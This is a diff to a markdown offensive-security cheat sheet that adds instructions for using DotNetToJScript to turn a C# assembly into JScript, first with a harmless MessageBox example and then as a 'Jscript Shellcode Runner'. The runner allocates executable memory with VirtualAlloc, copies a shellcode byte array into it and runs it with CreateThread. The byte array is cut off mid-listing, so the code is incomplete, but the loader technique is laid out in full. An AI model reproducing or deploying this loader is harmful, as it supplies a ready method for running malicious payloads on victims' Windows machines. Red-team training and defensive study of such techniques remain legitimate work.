@@ -1369,7 +1369,40 @@ To get a JScript file we will use [DotNetToJScript](https://github.com/tyranid/D
 **DotNetToJScript:**
 
 <details>
-  <summary>Expand</summary>
+  <summary>MessageBox Example</summary>
+1. Download DotNetToJScript project from [github](https://github.com/tyranid/DotNetToJScript))
+2. Open in Visual Studio
+3. Navigate to the Solution Explorer and open ``TestClass.cs`` under the ExampleAssembly project.
+4. Paste the C Sharp code (see below)
+5. Switch from Debug to Release mode and then: Build > Build Solution
+6. From DotNetToJScript folder copy ``DotNetToJscript.exe`` and ``NDesk.Options.dll`` to ``C:\Temp``
+7. From the ExampleAssembly folder copy ``ExampleAssembly.dll`` to ``C:\Temp`` 
+
+C Sharp code:
+```
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+[ComVisible(true)]
+public class TestClass
+{
+    public TestClass()
+    {
+        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+    }
+
+    public void RunProcess(string path)
+    {
+        Process.Start(path);
+    }
+}
+```
+
+Command:
+```
+DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
+```
 
 
 </details>
@@ -1456,6 +1489,64 @@ namespace ConsoleApp1
 Note: Set CPU to x64 before building the
 
 </details>
+
+**Jscript Shellcode Runner:**
+
+<details>
+  <summary>Expand</summary>
+
+C Sharp code:
+```
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+[ComVisible(true)]
+public class TestClass
+{
+
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, 
+      uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
+      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    public TestClass()
+    {
+        MessageBox.Show("Test", "Test", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+        byte[] buf = new byte[626] {
+            0xfc,0x48,0x83,0xe4,0xf0,0xe8...
+    
+        int size = buf.Length;
+    
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+    
+        Marshal.Copy(buf, 0, addr, size);
+    
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+    }
+
+    public void RunProcess(string path)
+    {
+        Process.Start(path);
+    }
+}
+```
+
+Command:
+```
+DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
+```
+</details>
+
 
 
 
